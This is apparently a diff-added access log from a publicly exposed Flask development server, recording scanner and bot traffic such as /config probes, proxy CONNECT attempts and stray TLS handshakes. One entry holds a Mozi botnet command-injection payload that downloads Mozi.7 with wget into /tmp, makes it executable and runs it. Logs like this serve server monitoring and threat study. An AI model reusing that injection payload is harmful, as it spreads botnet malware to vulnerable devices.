+87.121.69.52 - - [14/May/2024 15:15:45] "CONNECT google.com:443 HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 15:29:45] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 15:46:34] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 16:03:15] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 16:13:26] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 16:26:55] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 16:46:41] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 17:03:56] "GET /config HTTP/1.1" 404 -
+206.168.32.3 - - [14/May/2024 17:09:45] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [14/May/2024 17:09:48] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [14/May/2024 17:09:49] code 505, message Invalid HTTP version (2.0)
+206.168.32.3 - - [14/May/2024 17:09:49] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+95.214.27.7 - - [14/May/2024 17:16:06] "GET /config HTTP/1.1" 404 -
+87.236.176.35 - - [14/May/2024 17:21:08] "GET / HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 17:26:30] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 17:41:04] "GET /config HTTP/1.1" 404 -
+115.231.78.3 - - [14/May/2024 17:49:41] "GET / HTTP/1.1" 404 -
+115.231.78.3 - - [14/May/2024 17:49:42] "GET / HTTP/1.1" 404 -
+115.231.78.3 - - [14/May/2024 17:49:43] "GET /favicon.ico HTTP/1.1" 404 -
+115.231.78.3 - - [14/May/2024 17:49:43] "GET /robots.txt HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 18:00:17] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 18:16:42] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 18:26:34] "GET /config HTTP/1.1" 404 -
+83.97.73.245 - - [14/May/2024 18:27:59] "GET /jars HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 18:48:45] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 18:57:27] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 19:13:10] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 19:26:57] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 19:48:09] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 20:02:50] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 20:21:29] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 20:27:44] "GET /config HTTP/1.1" 404 -
+167.94.146.49 - - [14/May/2024 20:28:12] "GET / HTTP/1.1" 404 -
+167.94.146.49 - - [14/May/2024 20:28:15] "GET / HTTP/1.1" 404 -
+167.94.146.49 - - [14/May/2024 20:28:15] code 505, message Invalid HTTP version (2.0)
+167.94.146.49 - - [14/May/2024 20:28:15] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+95.214.27.7 - - [14/May/2024 20:44:47] "GET /config HTTP/1.1" 404 -
+87.121.69.52 - - [14/May/2024 20:53:01] "CONNECT google.com:443 HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 20:57:49] "GET /config HTTP/1.1" 404 -
+91.122.53.111 - - [14/May/2024 20:59:09] "GET /favicon.ico HTTP/1.1" 404 -
+91.122.53.111 - - [14/May/2024 20:59:16] "GET /favicon.ico HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 21:20:50] "GET /config HTTP/1.1" 404 -
+206.168.32.3 - - [14/May/2024 21:21:05] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [14/May/2024 21:21:08] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [14/May/2024 21:21:09] code 505, message Invalid HTTP version (2.0)
+206.168.32.3 - - [14/May/2024 21:21:09] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+95.214.27.7 - - [14/May/2024 21:30:44] "GET /config HTTP/1.1" 404 -
+91.122.53.111 - - [14/May/2024 21:37:17] "GET /wp-login.php HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 21:50:04] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 22:00:47] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 22:16:16] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 22:30:51] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 22:44:59] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 23:00:17] "GET /config HTTP/1.1" 404 -
+185.216.71.4 - - [14/May/2024 23:07:24] "CONNECT pro.ip-api.com:443 HTTP/1.1" 404 -
+185.216.71.4 - - [14/May/2024 23:07:24] code 400, message Bad request version ("\x86î\x11\x87î\x88\x19\x18\x88\x04±²\x00>\x13\x02\x13\x03\x13\x01À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ")
+185.216.71.4 - - [14/May/2024 23:07:24] "\x16\x03\x01\x01)\x01\x00\x01%\x03\x039D\x861cd\x8eZÍèÑ\x152 ¨çÜ\x9bÝ\x9foéèì\x10·\x9dGuÝØ¼ p\x95j\x8d\x07\x0d4X-¿»\x9cHs$Ç\x19¤)\x0b\x86î\x11\x87î\x88\x19\x18\x88\x04±²\x00>\x13\x02\x13\x03\x13\x01À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ" HTTPStatus.BAD_REQUEST -
+95.214.27.7 - - [14/May/2024 23:23:18] "GET /config HTTP/1.1" 404 -
+205.210.31.199 - - [14/May/2024 23:24:04] "GET / HTTP/1.0" 404 -
+95.214.27.7 - - [14/May/2024 23:38:00] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [14/May/2024 23:46:32] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 00:11:01] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 00:18:12] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 00:32:51] "GET /config HTTP/1.1" 404 -
+198.235.24.70 - - [15/May/2024 00:33:22] "GET / HTTP/1.1" 404 -
+141.98.11.79 - - [15/May/2024 00:49:06] "CONNECT google.com:443 HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 00:52:37] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 01:04:05] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 01:25:52] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 01:42:44] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 01:59:50] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 02:11:40] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 02:21:54] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 02:43:07] "GET /config HTTP/1.1" 404 -
+206.168.32.3 - - [15/May/2024 02:50:45] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [15/May/2024 02:50:48] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [15/May/2024 02:50:48] code 505, message Invalid HTTP version (2.0)
+206.168.32.3 - - [15/May/2024 02:50:48] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+95.214.27.7 - - [15/May/2024 02:57:02] "GET /config HTTP/1.1" 404 -
+178.215.236.52 - - [15/May/2024 03:02:19] "CONNECT 185.65.245.140:7227 HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 03:07:50] "GET /config HTTP/1.1" 404 -
+87.121.69.52 - - [15/May/2024 03:09:13] "CONNECT google.com:443 HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 03:29:01] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 03:47:49] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 03:55:53] "GET /config HTTP/1.1" 404 -
+64.62.156.110 - - [15/May/2024 03:59:05] "GET / HTTP/1.1" 404 -
+64.62.156.108 - - [15/May/2024 03:59:16] "GET /favicon.ico HTTP/1.1" 404 -
+64.62.156.113 - - [15/May/2024 03:59:22] "GET http://api.ipify.org/?format=json HTTP/1.1" 404 -
+64.62.156.115 - - [15/May/2024 03:59:25] "CONNECT www.shadowserver.org:443 HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 04:11:35] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 04:25:04] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 04:40:52] "GET /config HTTP/1.1" 404 -
+185.224.128.17 - - [15/May/2024 04:51:33] "CONNECT example.com:80 HTTP/1.1" 404 -
+185.224.128.17 - - [15/May/2024 04:51:48] code 400, message Bad request syntax ('\x05\x01\x00')
+185.224.128.17 - - [15/May/2024 04:51:48] "\x05\x01\x00" HTTPStatus.BAD_REQUEST -
+185.224.128.17 - - [15/May/2024 04:51:48] code 400, message Bad request syntax ('\x04\x01\x00P\x00\x00\x00\x01\x00example.com\x00')
+185.224.128.17 - - [15/May/2024 04:51:48] "\x04\x01\x00P\x00\x00\x00\x01\x00example.com\x00" HTTPStatus.BAD_REQUEST -
+95.214.27.7 - - [15/May/2024 05:05:32] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 05:20:53] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 05:31:31] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 05:44:44] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 06:07:09] "GET /config HTTP/1.1" 404 -
+117.200.187.35 - - [15/May/2024 06:20:34] code 400, message Bad HTTP/0.9 request type ("27%0A/bin/sh${IFS}-c${IFS}'cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}Mozi.7;${IFS}busybox${IFS}wget${IFS}http://%s:%d/Mozi.7;${IFS}chmod${IFS}777${IFS}Mozi.7;${IFS}./Mozi.7'%0A%27&loginUser=a&loginPwd=a")
+117.200.187.35 - - [15/May/2024 06:20:34] "27%0A/bin/sh${IFS}-c${IFS}'cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}Mozi.7;${IFS}busybox${IFS}wget${IFS}http://%s:%d/Mozi.7;${IFS}chmod${IFS}777${IFS}Mozi.7;${IFS}./Mozi.7'%0A%27&loginUser=a&loginPwd=a HTTP/1.0" HTTPStatus.BAD_REQUEST -
+205.210.31.196 - - [15/May/2024 06:20:47] code 400, message Bad request version ('À\x13À')
+205.210.31.196 - - [15/May/2024 06:20:47] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03)ml?èAmI\x9bæïò-\x99_{ç»@c\x89Z<ÐGê;¤KÆ®t \x92öö¹äd\x81g¨¸Úr²L®\x1aÀ\x88ÊÙ\x9bîqjîG5Ì\x83ëgJ\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+205.210.31.196 - - [15/May/2024 06:20:47] code 400, message Bad request version ('À(À$À\x14À')
+205.210.31.196 - - [15/May/2024 06:20:47] "\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03ùU E·7X»¿I\x09ñÂ\x88\x89Ù-\x1eæpÑÏÂ¿<\x89ù(D\x06áù\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À" HTTPStatus.BAD_REQUEST -
+95.214.27.7 - - [15/May/2024 06:22:02] "GET /config HTTP/1.1" 404 -
+104.248.163.226 - - [15/May/2024 06:24:14] code 400, message Bad request version ('$µ^úsÙöö')
+104.248.163.226 - - [15/May/2024 06:24:14] "\x16\x03\x01\x01û\x01\x00\x01÷\x03\x03Di\x9ee(ÂWÀ½\x11I\x8e÷Å\x1c;©¹6\x1c$µ^úsÙöö" HTTPStatus.BAD_REQUEST -
+95.214.27.7 - - [15/May/2024 06:34:54] "GET /config HTTP/1.1" 404 -
+45.79.128.205 - - [15/May/2024 06:36:23] code 400, message Bad request version ('À\x14À')
+45.79.128.205 - - [15/May/2024 06:36:23] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03d04J\x851\x8c\x95g\x9ei»E3\x8eÔÓøô\x92í\x0cJ\x04K X°ú\x86­r\x00\x00 À/À0À+À,Ì¨Ì©À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+95.214.27.7 - - [15/May/2024 06:48:25] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 07:05:25] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 07:38:26] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 07:45:25] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 08:00:46] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 08:23:07] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 08:37:54] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 08:47:38] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 09:01:03] "GET /config HTTP/1.1" 404 -
+87.121.69.52 - - [15/May/2024 09:03:29] "CONNECT google.com:443 HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 09:21:35] "GET /config HTTP/1.1" 404 -
+101.36.107.65 - - [15/May/2024 09:37:26] code 400, message Bad request version ('\x00\x9eÌ¨Ìª\x003\x00=\x00\x16À')
+101.36.107.65 - - [15/May/2024 09:37:26] "\x16\x03\x01\x01\x17\x01\x00\x01\x13\x03\x03\x0d¤¨Ã×3ªb/\x86)\x08É[\x8d\x18\x85\x0dR\x92^\x06\x7f¼ÅöÍ³aÁ­« ô"BlEÐÛDKü\x11@\x86Ëè\x0dÌ\x0dc\x07ã\x8fv®\x94Ñ)"¿¹\x01°\x004Ì¨Ì©À/À0À+À,À\x09\x00\x9eÌ¨Ìª\x003\x00=\x00\x16À" HTTPStatus.BAD_REQUEST -
+101.36.107.65 - - [15/May/2024 09:37:36] "GET / HTTP/1.1" 404 -
+101.36.107.65 - - [15/May/2024 09:37:37] "GET /favicon.ico HTTP/1.1" 404 -
+101.36.107.65 - - [15/May/2024 09:37:37] "GET /robots.txt HTTP/1.1" 404 -
+101.36.107.65 - - [15/May/2024 09:37:37] "GET /sitemap.xml HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 09:38:20] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 09:47:32] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 10:07:22] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 10:16:28] "GET /config HTTP/1.1" 404 -
+206.168.32.3 - - [15/May/2024 10:16:43] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [15/May/2024 10:16:47] "GET / HTTP/1.1" 404 -
+206.168.32.3 - - [15/May/2024 10:16:47] code 505, message Invalid HTTP version (2.0)
+206.168.32.3 - - [15/May/2024 10:16:47] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+95.214.27.7 - - [15/May/2024 10:36:47] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 10:50:35] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 11:04:48] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 11:20:14] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 11:32:11] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 11:54:24] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 12:06:27] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 12:16:05] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 12:37:26] "GET /config HTTP/1.1" 404 -
+83.97.73.245 - - [15/May/2024 12:46:43] "GET /jars HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 12:55:32] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 13:05:37] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 13:25:41] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 13:34:36] "GET /config HTTP/1.1" 404 -
+94.156.66.81 - - [15/May/2024 13:39:19] "CONNECT 45.61.137.126:7227 HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 13:55:53] "GET /config HTTP/1.1" 404 -
+95.214.27.7 - - [15/May/2024 14:04:25] "GET /config HTTP/1.1" 404 -
+ * Serving Flask app 'app'
+ * Debug mode: off
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:8081
+ * Running on http://62.68.147.97:8081
+Press CTRL+C to quit
+95.214.27.7 - - [15/May/2024 22:52:10] "GET /config HTTP/1.1" 404 -
